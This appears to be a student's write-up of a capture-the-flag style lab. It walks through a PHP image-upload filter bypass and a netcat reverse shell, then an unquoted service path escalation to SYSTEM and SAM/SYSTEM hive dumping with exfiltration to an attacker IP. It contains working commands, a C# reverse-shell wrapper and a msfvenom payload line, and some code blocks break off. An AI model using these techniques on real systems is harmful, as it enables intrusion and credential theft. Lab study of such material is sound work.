### PHP Code Review and Authentication

* Two filters in place: \
  1\) It is using the _getimagesize()_ function to check for the presence of dimensions encoded in their exif data. <mark style="color:red;background-color:purple;">**THIS IS VULNERABLE, but harder!**</mark> \ <mark style="color:red;background-color:purple;">****</mark>_OR_\
  2\) Using the `explode()` function to as a file-extension filter against a whitelist. <mark style="color:red;background-color:purple;">**THIS IS VULNERABLE!**</mark>&#x20;

```php
$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
        header("location: ./?msg=Fail");
        die();
```

* <mark style="color:green;">**The easier vulnerability**</mark>** -**\
  The `explode()` function is used to split a string at the specified character. Here it's being used to split the name of the file we uploaded at each period (`.`). \
  For a file called `image.jpeg`, this function would return the second element from the list: `["image", "jpeg"]` --> jpeg.\
  But for more than one file extension - `image.jpeg.php`. The filename gets split into `["image", "jpeg", "php"]`, but only the `jpeg` (as the second element in the list) gets passed into the filter!\\\

* <mark style="color:green;">**The harder vulnerability**</mark>** -**\
  ****Refer - [https://doddsecurity.com/94/remote-code-execution-in-the-avatars/](https://doddsecurity.com/94/remote-code-execution-in-the-avatars/)\
  This filter is checking for attributes that only an image will have, hence we will have to use a genuine image file.\
  Using `exiftool -Comment`, we can embed PHP code inside its metadata for the `getimagesize()` to execute.\
  Test code --> _`exiftool -Comment="`<mark style="color:yellow;">`<?php echo \"<pre>Test Payload</pre>\"; die(); ?>`</mark>`" test-dexter9.jpeg.php`_\

### REVERSE SHELL

Realistically we have several options here:

* [ ] Powershell tends to be the go-to for Windows reverse shells. Unfortunately Defender knows exactly what PowerShell reverse shells look like, so we'd have to do some serious obfuscation to get this to work.
* [ ] We could try to get a PHP reverse shell as we know the target has a PHP interpreter installed. Windows PHP reverse shells tend to be iffy though, and again, may trigger Defender.
* [ ] We could generate an executable reverse shell using msfvenom, then upload and activate it using the webshell. Again, msfvenom shells tend to be very distinctive. We could use the [Veil Framework](https://www.veil-framework.com) to give us a meterpreter shell executable that might bypass Defender, but let's try to keep this manual for the time. Equally, [shellter](https://www.shellterproject.com) (though old) might give us what we need. There are easier options though.
* [x] We could upload netcat. This is the quick and easy option.

Now there are hundreds of different variants -- the version of netcat for Windows that comes with Kali is known to Defender, so we're going to need a different version. Get from [here](https://github.com/int0x33/nc.exe/).

**For enumeration** - [https://nored0x.github.io/red-teaming/windows-enumeration/](https://nored0x.github.io/red-teaming/windows-enumeration/)\

* Checking for user privileges - `whoami /priv`&#x20;

![](<../../.gitbook/assets/image (13) (1).png>)

This will be a bit harder as this requires transferring files to the machine, we'll have to obfuscate those exploits to get them past the AV.

There are a whole lot of vulnerabilities other than these. This system is very unpatched!

![Service DLL hijacking vulnerable](<../../.gitbook/assets/image (23).png>)

Check which user runs this service, and the permissions on that directory.\
![](<../../.gitbook/assets/image (11).png>)![](<../../.gitbook/assets/image (6).png>)

### EXPLOITATION

* **VULNERABLE to **_<mark style="color:red;">**UNQUOTED SERVICE PATH**</mark>_** - **_<mark style="color:red;">**DLL HIJACKING**</mark>_** attack**

Unquoted service path vulnerabilities occur due to a very interesting aspect of how Windows looks for files. If a path in Windows contains spaces and is not surrounded by quotes&#x20;

> C:\Directory.exe\
> C:\Directory One\Directory.exe \
> C:\Directory One\Directory Two\Executable.exe

If we can create a file called `Directory.exe` in the root directory, or `C:\Directory One`, then we can trick Windows into executing our file instead!

Looking at the actual path of our vulnerable service: `C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`. We now have the following choices -

> In `C:\` --> Program.exe (<mark style="color:red;">NO</mark>)\
> In `C:\Program Files (x86)\` --> System.exe. (<mark style="color:red;">NO</mark>)\
> In `C:\Program Files (x86)\System Explorer\` --> System.exe (<mark style="color:green;">YES, possible</mark>)

With the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we _already have on the target._ We'll use Mono .NET core compiler for Linux.

* **Making the Exploit POC in C#**

```csharp
//import modules, allow us to start a new process
using System;
using System.Diagnostics;

//initialise namespace and class
namespace Wrapper{
    class Program{
        static void Main(){
        	//start new process, set parameters
            	Process proc = new Process();
		ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-dexter9.exe", "10.50.82.178 54321 -e cmd.exe");
            	procInfo.CreateNoWindow = true;
            	//attach 'ProcessStartInfo' object to the process
            	proc.StartInfo = procInfo;
		proc.Start();
        }
    }
}
```

Compile the code using `mono` and transfer to the target host.\
![](<../../.gitbook/assets/image (15).png>)\
![](<../../.gitbook/assets/image (24).png>)\
Check the execution, and its working!\
![](<../../.gitbook/assets/image (3).png>)E

* **Exploiting the Path Injection and getting `NT AUTHORITY\SYSTEM`**

We will now put the callback function in `C:\Program Files (x86)\System Explorer\` and call it _System.exe_\
Then **restart the service** to trigger the reverse shell using `sc stop|start <ServiceName>`\
****![](<../../.gitbook/assets/image (22).png>)****\
****![](<../../.gitbook/assets/image (25).png>)\
Our malicious executable caused the Service to fail, but executed the reverse callback.

{% hint style="info" %}
We should write a real Windows Service executable in C# and try to create a wrapper (or even a full reverse shell!) that doesn't cause the `sc start` command to error out. Refer --> [https://github.com/mattymcfatty/unquotedPoC](https://github.com/mattymcfatty/unquotedPoC)****

### **GETTING PERSISTENCE ON THE MACHINE**

* Dumping NTLM hashes from SAM database

1\) There's no way we can run _Mimikatz_ easily with Win Defender running, but since we're root - we can just disable the `windefender` service! \
\
2\) Local user hashes are stored in the Windows Registry whilst the computer is running -- specifically in the `HKEY_LOCAL_MACHINE\SAM` hive. This can also be found as a file at `C:\Windows\System32\Config\SAM`, however, this isn't readable when system is running. We also need the `SYSTEM` hive which contains the boot key for the machine.\
\
To dump the hashes locally, we'll save the SAM & SYSTEM hive, then exfiltrate it using the smb:

```
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak    #big in size
```

![](<../../.gitbook/assets/image (14).png>)****

* **Transfer to attacker host** \[<mark style="color:red;">Base64 failed</mark>, <mark style="color:green;">SMB succeeded</mark>]

Switch to `powershell` and transfer using Base64, didn't work as memory exception occurred due to file size.&#x20;

```powershell
$b64a = [System.convert]::ToBase64String((Get-Content -Path 'c:\Users\Thomas\Documents\sam.bak' -Encoding Byte))
Invoke-WebRequest -Uri http://10.50.82.178:50001 -Method POST -Body $b64a 

$b64b = [System.convert]::ToBase64String((Get-Content -Path 'c:\Users\Thomas\Documents\system.bak' -Encoding Byte))

## SOME THEORY :)

<details>

<summary>Cross-compilation</summary>

Cross compilation is an essential skill -- although in many ways it's preferable to avoid it.

First up: what is cross compilation? The idea is to compile source code into a working program to run on a different platform. In other words, cross compilation would allow us to compile a program for a different Linux kernel, a Windows program on Kali (as we're doing here), or even software for an embedded device or phone.

Whilst cross-compilation is a very useful skill to have, it's often difficult to get completely correct. Ideally we should always try to compile our code in an environment as close to the target environment as possible. For example, if an exploit or program is designed to work on CentOS 7.2, we should try to compile it in a CentOS 7.2 VM if possible. Equally, it's essential that we get the same arch as that of the target -- a 64 bit program won't work very well on a 32 bit target!

Sometimes it's easiest to just cross-compile, however. Generally speaking we cross compile x64 Windows programs on Kali using the `mingw-w64` package (for x64 systems). This is not installed on Kali by default, however it is available in the Kali apt repositories:\
`sudo apt install mingw-w64`\


This is a big package, but once it's installed we can start re-compiling netcat.

Much like we use `gcc` to compile binaries on Linux, we can use the `mingw` compilers to compile Windows binaries. These tend to have very descriptive (read: long) names, but the one that's of particular importance to us here is `x86_64-w64-mingw32-gcc`. This specifies that we want to compile a 64bit binary.

Inside the nc.exe repository we downloaded, delete or move the two pre-compiled netcat binaries. The repository provides a makefile which we can use (with some small alterations) to compile the binary. Open up the `Makefile` with your favourite text editor. The first two lines specify which compiler to use:\
![The first two lines of the Makefile at their default](https://assets.tryhackme.com/additional/wreath-network/499921a44689.png)

Neither of these are quite what we're looking for, so comment out the first line and add another line underneath:\
`CC=x86_64-w64-mingw32-gcc`\
![The first (now three) lines of the makefile after commenting out the first line and adding in the correct compiler on line three](https://assets.tryhackme.com/additional/wreath-network/d71f7f2fcb0e.png)

Now when we run `make` to build the binary, the correct compiler will be used to generate a x64 Windows executable. Note that there will be a lot of warnings generated by the compiler (these have been redirected to `/dev/null` in the following screenshot for readability, however, you do not need to do this). These are nothing to worry about; the compilation should still be successful.

Try generating a metasploit reverse shell and transfer it to the target (`msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=ATTACKING_IP LPORT=CHOOSE_A_PORT`) -- make sure to place it in a directory you can list (e.g. the Uploads directory of the webserver). This shell will get picked up by Defender (so don't do it anywhere else!), but it will give you a feel for how antivirus operates when it detects your payload as being malicious.

You should get an error message when trying to execute the executable and the exe will also disappear from the current directory (placed into quarantine by the AV). At this point the Administrator has also been alerted, along with the security team in a bigger organisation.

<summary>Privilege Escalation - Unquoted service path</summary>

with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we _already have on the target._ To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system). Ideally we would write a full C# service file that would integrate seamlessly with the Windows service management system. Whilst this is perfectly possible (and is by far the preferable option), for the sake of simplicity, we will stick to just creating a standalone executable. It's worth noting that this technique is effective at bypassing the antivirus software on the target; however, in an enterprise situation there is a good chance that it would be picked up by an intrusion detection system. In this scenario we would be looking for a more sophisticated (if similar) solution.\


Ideally we'd be using Visual Studio here. If you happen to have a Windows host and are familiar with Visual Studio then please feel free to use it for. As not everyone has access to a Windows machine (or is comfortable installing Windows as a virtual machine), the teaching content will work with the `mono` dotnet core compiler for Linux. This can be easily installed on Kali and will allow us to compile C# executables that can be run on Windows targets. The same code will work just fine if compiled in Visual Studio, however.

<summary>Data Exfiltration [Undetected]</summary>

The goal of exfiltration is always to remove data from a compromised target. This could be things like passwords, keys, customer/employee data, or anything else of use or value. If the data being exfiltrated is in plain text then this could be as simple as copying and pasting the contents of a file from a remote shell into a local file. If the data is in a binary format, or otherwise can't just be copied and pasted, then more complicated methods must be used to exfiltrate the targeted file.

A common method for exfiltrating data is to smuggle it out within a harmless protocol, usually encoded. For example, DNS is often used to (relatively) quietly exfiltrate data. HTTPS tends to be a good option as the data will outright be encrypted before egress takes place. ICMP can be used to (very slowly) get the data out of the network. DNS-over-HTTPS is superb for data exfiltration, and even email is often used.\


In a real world situation an attacker will be looking to exfiltrate data as quietly as possible as there may be an Intrusion Detection System active on the compromised network which would alert the network administrators to a breach should the data be detected. For this reason an attacker is unlikely to use protocols as simple as FTP, TFTP, SMB or HTTP; however, in an unmonitored network these are still good options for moving files around.

It's worth noting that most command and control (C2) frameworks come with options to quietly exfiltrate data. Practically speaking, this is likely how a bad actor would be exfiltrating data, so it's worth keeping up to date with the current "standards" used by the various frameworks. There are also plenty of standalone tools available to automate sending and receiving obfuscated data.
